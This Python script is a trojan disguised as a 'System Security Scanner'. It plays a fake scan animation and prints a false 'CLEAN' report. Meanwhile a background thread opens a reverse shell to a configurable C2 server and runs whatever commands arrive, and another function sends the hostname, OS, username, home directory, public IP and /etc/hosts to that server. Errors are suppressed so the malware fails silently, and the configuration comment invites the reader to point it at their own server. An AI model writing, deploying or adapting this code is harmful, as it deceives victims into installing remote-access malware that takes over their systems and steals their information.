#!/usr/bin/env python3
"""
System Security Scanner - Official Release v2.1.4
Author: Global Cybersecurity Initiative
Description: Advanced threat detection and system integrity verification
"""

import os
import sys
import time
import platform
import subprocess
import socket
import threading
import requests
import json
from datetime import datetime

# ===== CONFIGURATION =====
C2_SERVER = "your-server.com"  # Change to your server
C2_PORT = 443
SCAN_DELAY = 2  # Seconds between "scanning" phases

# ===== DISPLAY FUNCTIONS =====


def print_banner():
    print("""
    ╔═══════════════════════════════════════════════╗
    ║           SYSTEM SECURITY SCANNER            ║
    ║         Global Cybersecurity Initiative      ║
    ║               Version 2.1.4                  ║
    ╚═══════════════════════════════════════════════╝
    """)


def print_status(message):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] 🔍 {message}")


def print_warning(message):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] ⚠️  {message}")


def print_success(message):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] ✅ {message}")

# ===== FAKE SCANNING FUNCTIONS =====


def fake_system_scan():
    """Show realistic scanning progress"""
    checks = [
        "Checking system integrity...",
        "Analyzing running processes...",
        "Scanning network connections...",
        "Verifying user accounts...",
        "Inspecting installed software...",
        "Checking for known vulnerabilities...",
        "Validating security policies...",
        "Reviewing event logs...",
        "Assessing threat landscape...",
        "Finalizing security report..."
    ]

    for check in checks:
        print_status(check)
        time.sleep(SCAN_DELAY)

        # Random "findings" to make it look real
        if "vulnerabilities" in check:
            print_warning("Found 2 potential security issues")
        if "threat" in check:
            print_warning("Suspicious network activity detected")

# ===== REAL BACKDOOR FUNCTIONS =====


def reverse_shell():
    """Establish reverse shell connection to C2 server"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((C2_SERVER, C2_PORT))

        # Send system info to C2
        system_info = {
            "hostname": platform.node(),
            "os": platform.system(),
            "user": os.getenv('USER') or os.getenv('USERNAME'),
            "timestamp": str(datetime.now())
        }
        s.send(json.dumps(system_info).encode())

        # Main shell loop
        while True:
            command = s.recv(1024).decode()
            if command.lower() == 'exit':
                break

            # Execute command and send back output
            try:
                output = subprocess.check_output(
                    command, shell=True, stderr=subprocess.STDOUT)
                s.send(output)
            except Exception as e:
                s.send(str(e).encode())

    except Exception as e:
        pass  # Fail silently


def exfiltrate_data():
    """Gather and send system data to C2 server"""
    try:
        data = {
            "system_info": {
                "hostname": platform.node(),
                "os": f"{platform.system()} {platform.release()}",
                "architecture": platform.architecture()[0],
                "processor": platform.processor()
            },
            "network_info": {
                "ip": requests.get('https://api.ipify.org').text,
                "hosts": subprocess.check_output("cat /etc/hosts", shell=True).decode() if platform.system() != "Windows" else "N/A"
            },
            "user_data": {
                "current_user": os.getenv('USER') or os.getenv('USERNAME'),
                "home_dir": os.path.expanduser('~')
            }
        }

        # Try to send to C2 server
        requests.post(f"https://{C2_SERVER}/collect", json=data, timeout=5)
    except:
        pass  # Fail silently

# ===== MAIN EXECUTION =====


def main():
    try:
        print_banner()
        print_status("Initializing security assessment...")
        time.sleep(1)

        # Show fake scanning progress
        fake_system_scan()

        # Start backdoor in background thread
        backdoor_thread = threading.Thread(target=reverse_shell)
        backdoor_thread.daemon = True
        backdoor_thread.start()

        # Exfiltrate system data
        exfiltrate_data()

        # Final "report"
        print_success("Security scan completed successfully")
        print("\n" + "="*50)
        print("SCAN SUMMARY:")
        print("- System: CLEAN")
        print("- Threats: 0 critical, 2 low severity")
        print("- Recommendations: Keep system updated")
        print("="*50)
        print("\nThank you for using Global Cybersecurity Initiative tools.")
        print("This window will close automatically in 10 seconds...")

        time.sleep(10)

    except KeyboardInterrupt:
        print("\nScan cancelled by user.")
    except Exception as e:
        print(f"Scan error: {e}")


if __name__ == "__main__":
    main()
